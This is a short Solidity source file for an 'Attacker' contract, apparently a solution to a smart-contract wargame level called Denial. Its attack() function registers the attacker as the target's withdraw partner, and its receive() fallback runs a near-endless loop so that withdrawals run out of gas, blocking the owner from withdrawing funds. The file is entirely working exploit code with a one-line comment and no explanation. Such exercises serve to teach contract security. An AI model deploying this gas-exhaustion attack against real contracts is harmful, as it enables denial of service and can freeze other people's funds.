// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker {
    address owner;
    Denial denialContract;
    uint256 counter;

    constructor(Denial _denialContract) {
        owner = msg.sender;
        denialContract = _denialContract;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function attack() public onlyOwner {
        denialContract.setWithdrawPartner(address(this));
    }

//extreme loop in fallback that can cause an out of gas error 
    receive() external payable {
        for (uint i = 0; i < type(uint256).max; i++) {
            counter++;
        }
    }
}
